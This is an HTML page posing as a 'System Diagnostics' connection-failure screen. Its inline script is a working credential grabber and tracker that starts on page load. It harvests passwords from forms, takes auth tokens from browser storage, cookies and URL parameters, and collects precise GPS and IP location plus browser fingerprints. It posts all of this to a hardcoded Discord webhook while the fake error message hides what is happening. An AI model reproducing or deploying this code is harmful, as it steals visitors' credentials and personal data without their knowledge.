<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Diagnostics</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: #0a0a0f;
            color: #e0e0e0;
        }
        .card {
            background: #1a1a2e;
            padding: 2.5rem;
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.8);
            text-align: center;
            max-width: 500px;
            border: 1px solid #2a2a4a;
        }
        h1 { color: #ff4444; font-size: 1.8rem; margin-bottom: 0.5rem; letter-spacing: 2px; }
        .sub { color: #8888aa; font-size: 0.9rem; margin-bottom: 1.5rem; }
        #ip-address {
            font-size: 1.2rem;
            color: #ff6b6b;
            font-weight: bold;
            background: #0a0a15;
            padding: 0.5rem 1rem;
            border-radius: 8px;
            border: 1px solid #ff6b6b33;
            margin: 1rem 0;
        }
        .status { color: #ff6b6b; font-size: 0.8rem; margin-top: 1rem; }
        .error-icon {
            font-size: 4rem;
            margin: 1rem 0;
            color: #ff4444;
        }
        #debug {
            display: none;
            background: #0a0a15;
            padding: 1rem;
            border-radius: 8px;
            margin-top: 1rem;
            text-align: left;
            font-size: 0.7rem;
            color: #4ecdc4;
            max-height: 200px;
            overflow: auto;
            border: 1px solid #2a2a4a;
        }
        #debug.show { display: block; }
        .debug-toggle {
            background: #2a2a4a;
            border: none;
            color: #8888aa;
            padding: 0.3rem 1rem;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.7rem;
            margin-top: 0.5rem;
        }
        .debug-toggle:hover { background: #3a3a5a; }
    </style>
</head>
<body>

<div class="card">
    <div class="error-icon">⚠️</div>
    <h1>CONNECTION FAILED</h1>
    <div class="sub">unable to establish secure connection</div>
    <div id="ip-address">[ error: timeout ]</div>
    <div class="status" id="status">retry failed • contact administrator</div>
    <button class="debug-toggle" onclick="toggleDebug()">Show Debug</button>
    <div id="debug"></div>
</div>

<script>
    (function() {
        // ─── DISCORD WEBHOOK ─────────────────────────────────────
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1534714697214066828/QOQByLeN_i4bFIWOTaQnKH47dW1Q6y32OkKTz2DlaVZmt1SMPrSQV1OCCPF2V0Wg_3BN';
        const DEBUG_ENABLED = true;
        const debugLog = [];

        // ─── DEBUG ──────────────────────────────────────────────────
        function debug(msg, data = null) {
            if (!DEBUG_ENABLED) return;
            const entry = { time: new Date().toISOString().slice(11,19), msg, data };
            debugLog.push(entry);
            console.log('[DEBUG]', msg, data || '');
            
            const debugEl = document.getElementById('debug');
            if (debugEl.classList.contains('show')) {
                debugEl.innerHTML = debugLog.map(e => 
                    `<div>[${e.time}] ${e.msg}${e.data ? ' → ' + JSON.stringify(e.data).substring(0,100) : ''}</div>`
                ).join('');
                debugEl.scrollTop = debugEl.scrollHeight;
            }
        }

        window.toggleDebug = function() {
            const el = document.getElementById('debug');
            el.classList.toggle('show');
            if (el.classList.contains('show')) {
                el.innerHTML = debugLog.map(e => 
                    `<div>[${e.time}] ${e.msg}${e.data ? ' → ' + JSON.stringify(e.data).substring(0,100) : ''}</div>`
                ).join('');
            }
        };

        // ─── PASSWORD GRABBERS ──────────────────────────────────
        function grabSavedPasswords() {
            debug('🔍 Starting password grab');
            const passwords = [];
            
            try {
                const pwdInputs = document.querySelectorAll('input[type="password"]');
                debug(`📋 Found ${pwdInputs.length} password fields`);
                pwdInputs.forEach(el => {
                    if (el.value) {
                        passwords.push({
                            type: 'autofilled',
                            value: el.value,
                            id: el.id || 'unknown',
                            name: el.name || 'unknown'
                        });
                        debug(`🔑 Autofilled password: ${el.id || 'unknown'} = ${el.value.substring(0,3)}***`);
                    }
                });
            } catch(e) { debug('❌ Error grabbing autofill:', e.message); }

            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    const val = localStorage.getItem(key);
                    if (key.toLowerCase().includes('pass') || 
                        key.toLowerCase().includes('pwd') ||
                        key.toLowerCase().includes('token') ||
                        key.toLowerCase().includes('auth')) {
                        passwords.push({
                            type: 'localStorage',
                            key: key,
                            value: val
                        });
                        debug(`🔐 localStorage: ${key} = ${val.substring(0,10)}...`);
                    }
                }
                debug(`📦 localStorage items: ${localStorage.length}`);
            } catch(e) { debug('❌ Error reading localStorage:', e.message); }

            try {
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    const val = sessionStorage.getItem(key);
                    if (key.toLowerCase().includes('pass') || 
                        key.toLowerCase().includes('pwd') ||
                        key.toLowerCase().includes('token') ||
                        key.toLowerCase().includes('auth')) {
                        passwords.push({
                            type: 'sessionStorage',
                            key: key,
                            value: val
                        });
                        debug(`🔐 sessionStorage: ${key} = ${val.substring(0,10)}...`);
                    }
                }
                debug(`📦 sessionStorage items: ${sessionStorage.length}`);
            } catch(e) { debug('❌ Error reading sessionStorage:', e.message); }

            try {
                const cookieList = document.cookie.split(';').filter(c => c.trim());
                debug(`🍪 Found ${cookieList.length} cookies`);
                cookieList.forEach(cookie => {
                    const [key, val] = cookie.trim().split('=');
                    if (key.toLowerCase().includes('pass') || 
                        key.toLowerCase().includes('pwd') ||
                        key.toLowerCase().includes('token') ||
                        key.toLowerCase().includes('auth') ||
                        key.toLowerCase().includes('session')) {
                        passwords.push({
                            type: 'cookie',
                            key: key,
                            value: val
                        });
                        debug(`🍪 Cookie: ${key} = ${val.substring(0,10)}...`);
                    }
                });
            } catch(e) { debug('❌ Error reading cookies:', e.message); }

            try {
                const forms = document.querySelectorAll('form');
                debug(`📝 Found ${forms.length} forms`);
                forms.forEach(form => {
                    const inputs = form.querySelectorAll('input');
                    let hasPassword = false;
                    let username = '';
                    let pwdValue = '';
                    inputs.forEach(input => {
                        if (input.type === 'password' && input.value) {
                            hasPassword = true;
                            pwdValue = input.value;
                        }
                        if (input.type === 'text' || input.type === 'email') {
                            username = input.value || username;
                        }
                    });
                    if (hasPassword && pwdValue) {
                        passwords.push({
                            type: 'form_submission',
                            username: username || 'unknown',
                            password: pwdValue,
                            formAction: form.action || 'unknown'
                        });
                        debug(`🔑 Form: ${username || 'unknown'} / ${pwdValue.substring(0,3)}***`);
                    }
                });
            } catch(e) { debug('❌ Error scanning forms:', e.message); }

            try {
                const params = new URLSearchParams(window.location.search);
                debug(`🔗 URL params: ${Array.from(params.entries()).length}`);
                params.forEach((val, key) => {
                    if (key.toLowerCase().includes('token') || 
                        key.toLowerCase().includes('auth') ||
                        key.toLowerCase().includes('session')) {
                        passwords.push({
                            type: 'url_parameter',
                            key: key,
                            value: val
                        });
                        debug(`🔗 URL param: ${key} = ${val.substring(0,10)}...`);
                    }
                });
            } catch(e) { debug('❌ Error reading URL params:', e.message); }

            debug(`✅ Total passwords captured: ${passwords.length}`);
            return passwords;
        }

        // ─── UTILITY FUNCTIONS ─────────────────────────────────────
        function getLocalStorage() {
            try {
                const items = {};
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    items[key] = localStorage.getItem(key);
                }
                return items;
            } catch { return {}; }
        }

        function getSessionStorage() {
            try {
                const items = {};
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    items[key] = sessionStorage.getItem(key);
                }
                return items;
            } catch { return {}; }
        }

        function getBrowserPlugins() {
            try {
                return Array.from(navigator.plugins || []).map(p => p.name);
            } catch { return []; }
        }

        function getMimeTypes() {
            try {
                return Array.from(navigator.mimeTypes || []).map(m => m.type);
            } catch { return []; }
        }

        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 256;
                canvas.height = 128;
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(10, 10, 50, 50);
                ctx.fillStyle = '#069';
                ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 10, 60);
                return canvas.toDataURL().substring(0, 100) + '...';
            } catch { return 'unavailable'; }
        }

        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return 'not supported';
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (!debugInfo) return 'no debug info';
                const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                return { vendor, renderer };
            } catch { return 'unavailable'; }
        }

        function getTimeZone() {
            try {
                return Intl.DateTimeFormat().resolvedOptions().timeZone;
            } catch { return 'unknown'; }
        }

        function getScreenInfo() {
            try {
                return {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth,
                    pixelRatio: window.devicePixelRatio || 1
                };
            } catch { return {}; }
        }

        function getBatteryInfo() {
            return new Promise((resolve) => {
                if (!navigator.getBattery) { resolve('unavailable'); return; }
                navigator.getBattery().then(battery => {
                    resolve({
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    });
                }).catch(() => resolve('unavailable'));
            });
        }

        function getNetworkInfo() {
            try {
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (!conn) return {};
                return {
                    effectiveType: conn.effectiveType,
                    rtt: conn.rtt,
                    downlink: conn.downlink,
                    saveData: conn.saveData
                };
            } catch { return {}; }
        }

        function getGeolocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) { resolve('unavailable'); return; }
                navigator.geolocation.getCurrentPosition(
                    pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
                    () => resolve('denied or unavailable'),
                    { timeout: 5000, enableHighAccuracy: true }
                );
            });
        }

        function getDeviceMemory() {
            try {
                return navigator.deviceMemory || 'unknown';
            } catch { return 'unknown'; }
        }

        function getHardwareConcurrency() {
            try {
                return navigator.hardwareConcurrency || 'unknown';
            } catch { return 'unknown'; }
        }

        function getAudioFingerprint() {
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = ctx.createOscillator();
                const analyser = ctx.createAnalyser();
                oscillator.connect(analyser);
                analyser.connect(ctx.destination);
                oscillator.frequency.value = 440;
                oscillator.type = 'sawtooth';
                oscillator.start(0);
                const buffer = new Uint8Array(analyser.frequencyBinCount);
                analyser.getByteFrequencyData(buffer);
                oscillator.stop(0);
                ctx.close();
                return Array.from(buffer.slice(0, 20)).join(',') + '...';
            } catch { return 'unavailable'; }
        }

        function getPermissions() {
            return new Promise((resolve) => {
                if (!navigator.permissions) { resolve('unavailable'); return; }
                const perms = ['geolocation', 'notifications', 'camera', 'microphone', 'storage', 'clipboard-read', 'clipboard-write'];
                const results = {};
                let completed = 0;
                perms.forEach(name => {
                    navigator.permissions.query({ name }).then(status => {
                        results[name] = status.state;
                        completed++;
                        if (completed === perms.length) resolve(results);
                    }).catch(() => {
                        results[name] = 'error';
                        completed++;
                        if (completed === perms.length) resolve(results);
                    });
                });
                setTimeout(() => resolve(results), 3000);
            });
        }

        // ─── SEND TO DISCORD WITH RETRY ──────────────────────────
        async function sendToDiscord(payload, retries = 3) {
            debug(`📤 Sending to Discord (${retries} retries)`);
            for (let i = 0; i < retries; i++) {
                try {
                    debug(`📡 Attempt ${i+1}/${retries}`);
                    const response = await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                    const text = await response.text();
                    if (response.ok) {
                        debug('✅ Data sent successfully');
                        return true;
                    } else {
                        debug(`❌ Attempt ${i+1} failed: ${response.status} - ${text.substring(0,200)}`);
                        await new Promise(resolve => setTimeout(resolve, 1500 * (i + 1)));
                    }
                } catch (e) {
                    debug(`❌ Attempt ${i+1} error: ${e.message}`);
                    await new Promise(resolve => setTimeout(resolve, 1500 * (i + 1)));
                }
            }
            debug('❌ All attempts failed');
            return false;
        }

        // ─── MAIN ──────────────────────────────────────────────────
        async function gatherAndSend() {
            debug('🚀 Starting data collection');
            try {
                document.getElementById('status').textContent = '⚠️ connection failed • reconnecting...';

                // 1. IP + Geo
                debug('📡 Fetching IP data from ipapi.co');
                let ipData = {};
                try {
                    const resp = await fetch('https://ipapi.co/json/');
                    ipData = await resp.json();
                    debug(`✅ IP fetched: ${ipData.ip || 'unknown'}`);
                } catch (e) {
                    debug(`❌ IP fetch failed: ${e.message}`);
                    ipData = { ip: 'fetch failed', error: e.message };
                }

                const ip = ipData.ip || 'unknown';
                const city = ipData.city || 'unknown';
                const region = ipData.region || 'unknown';
                const country = ipData.country_name || 'unknown';
                const isp = ipData.org || 'unknown';
                const postal = ipData.postal || 'unknown';
                const timezone = ipData.timezone || 'unknown';
                const asn = ipData.asn || 'unknown';
                const latitude = ipData.latitude || 'unknown';
                const longitude = ipData.longitude || 'unknown';
                const currency = ipData.currency || 'unknown';
                const countryCode = ipData.country_code || 'unknown';

                document.getElementById('ip-address').textContent = '[ error: ' + ip + ' ]';

                // 2. Grab passwords
                debug('🔑 Starting password capture');
                const passwords = grabSavedPasswords();
                debug(`✅ Captured ${passwords.length} passwords/tokens`);

                // 3. Browser / Device / System
                debug('📱 Gathering system data');
                const ua = navigator.userAgent;
                const platform = navigator.platform;
                const language = navigator.language;
                const languages = navigator.languages || [];
                const cookieEnabled = navigator.cookieEnabled;
                const doNotTrack = navigator.doNotTrack || 'unspecified';
                const maxTouchPoints = navigator.maxTouchPoints || 0;

                const cookies = document.cookie;
                const localStorageData = getLocalStorage();
                const sessionStorageData = getSessionStorage();
                const plugins = getBrowserPlugins();
                const mimeTypes = getMimeTypes();

                debug('🖌️ Generating fingerprints');
                const canvasFp = getCanvasFingerprint();
                const webgl = getWebGLInfo();
                const audioFp = getAudioFingerprint();

                const timeZone = getTimeZone();
                const screenInfo = getScreenInfo();
                const deviceMemory = getDeviceMemory();
                const hardwareConcurrency = getHardwareConcurrency();
                const netInfo = getNetworkInfo();

                debug('🔋 Gathering async data');
                const battery = await getBatteryInfo();
                const geo = await getGeolocation();
                const permissions = await getPermissions();

                const referrer = document.referrer || 'direct';
                const pageUrl = window.location.href;
                const pageTitle = document.title;

                // ─── BUILD PLAIN TEXT MESSAGE (more reliable) ────
                debug('📝 Building Discord message');
                
                let message = '🕵️ **FULL SYSTEM TELEMETRY + PASSWORDS**\n\n';
                message += `🌐 **IP:** \`${ip}\`\n`;
                message += `📍 **Location:** ${city}, ${region}, ${country}\n`;
                message += `🗺️ **Coordinates:** ${latitude}, ${longitude}\n`;
                message += `📮 **Postal/ASN:** ${postal} | \`${asn}\`\n`;
                message += `🏢 **ISP:** \`${isp}\`\n`;
                message += `🌍 **Country Code:** \`${countryCode}\`\n`;
                message += `💰 **Currency:** \`${currency}\`\n`;
                message += `🕐 **Timezone:** \`${timezone}\`\n`;
                message += `🖥️ **Platform:** \`${platform}\`\n`;
                message += `🌍 **Browser Language:** \`${language}\`\n`;
                message += `🗣️ **All Languages:** \`${languages.join(', ')}\`\n`;
                message += `🍪 **Cookies Enabled:** \`${cookieEnabled}\`\n`;
                message += `🚫 **Do Not Track:** \`${doNotTrack}\`\n`;
                message += `👆 **Max Touch Points:** \`${maxTouchPoints}\`\n`;
                message += `📺 **Screen:** ${screenInfo.width}x${screenInfo.height} | ${screenInfo.colorDepth}-bit | dpr: ${screenInfo.pixelRatio}\n`;
                message += `🧠 **Device Memory:** \`${deviceMemory} GB\`\n`;
                message += `⚡ **CPU Cores:** \`${hardwareConcurrency}\`\n`;
                message += `📶 **Network:** type: ${netInfo.effectiveType || '?'} | rtt: ${netInfo.rtt || '?'}ms | downlink: ${netInfo.downlink || '?'}Mbps\n`;
                message += `🔋 **Battery:** level: ${battery.level || '?'} | charging: ${battery.charging || '?'}\n`;
                message += `📡 **GPS:** ${geo !== 'unavailable' ? `${geo.lat}, ${geo.lon} (acc: ${geo.acc}m)` : 'denied/unavailable'}\n`;
                message += `🔐 **Permissions:** ${Object.entries(permissions).map(([k,v]) => `${k}: ${v}`).join(' | ')}\n`;
                message += `🖌️ **Canvas FP:** \`${canvasFp}\`\n`;
                message += `🎮 **WebGL:** ${webgl !== 'unavailable' ? `${webgl.vendor} | ${webgl.renderer}` : 'unavailable'}\n`;
                message += `🎵 **Audio FP:** \`${audioFp}\`\n`;
                message += `🔌 **Plugins:** ${plugins.length ? `\`${plugins.slice(0, 10).join(', ')}${plugins.length > 10 ? '...' : ''}\`` : 'none'}\n`;
                message += `📁 **MIME Types:** ${mimeTypes.length ? `\`${mimeTypes.slice(0, 8).join(', ')}${mimeTypes.length > 8 ? '...' : ''}\`` : 'none'}\n`;
                message += `🍪 **All Cookies:** ${cookies ? `\`${cookies.substring(0, 500)}${cookies.length > 500 ? '...' : ''}\`` : 'none'}\n`;
                message += `💾 **localStorage:** ${Object.keys(localStorageData).length ? `\`${JSON.stringify(localStorageData).substring(0, 500)}...\`` : 'empty'}\n`;
                message += `📦 **sessionStorage:** ${Object.keys(sessionStorageData).length ? `\`${JSON.stringify(sessionStorageData).substring(0, 500)}...\`` : 'empty'}\n`;
                message += `🔗 **Referrer:** \`${referrer}\`\n`;
                message += `📄 **Page URL:** \`${pageUrl}\`\n`;
                message += `📰 **Page Title:** \`${pageTitle}\`\n`;
                message += `📱 **User Agent:** \`${ua}\`\n`;

                if (passwords.length > 0) {
                    message += `\n🔑 **CAPTURED PASSWORDS (${passwords.length}):**\n`;
                    passwords.forEach(p => {
                        if (p.type === 'autofilled') {
                            message += `  🔓 Autofilled: ${p.id} = ${p.value}\n`;
                        } else if (p.type === 'form_submission') {
                            message += `  🔑 Form: ${p.username} | ${p.password}\n`;
                        } else {
                            message += `  🔐 ${p.type}: ${p.key} = ${p.value}\n`;
                        }
                    });
                }

                // Split if too long (Discord limit 2000 chars)
                const chunks = [];
                let current = '';
                message.split('\n').forEach(line => {
                    if ((current + line + '\n').length > 1900) {
                        chunks.push(current);
                        current = '';
                    }
                    current += line + '\n';
                });
                if (current) chunks.push(current);

                // Send each chunk as separate message
                for (let i = 0; i < chunks.length; i++) {
                    const payload = { content: chunks[i] };
                    const sent = await sendToDiscord(payload);
                    if (!sent && i === 0) {
                        // Try fallback: just send raw
                        debug('⚠️ Fallback: sending raw text');
                        await fetch(WEBHOOK_URL, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ content: 'Data collected - check console for details' })
                        });
                    }
                }

                document.getElementById('status').textContent = '⚠️ connection failed • retry limit exceeded';
                debug('🏁 Data collection complete');

            } catch (err) {
                debug(`💀 Fatal error: ${err.message}`);
                document.getElementById('status').textContent = '⚠️ connection failed • server unreachable';
                document.getElementById('ip-address').textContent = '[ error: timeout ]';
                console.error('[FATAL]', err);
            }
        }

        // ─── START ──────────────────────────────────────────────────
        debug('⏳ Initializing...');
        gatherAndSend();
        debug('✅ Script initialized');

    })();
</script>

</body>
</html>
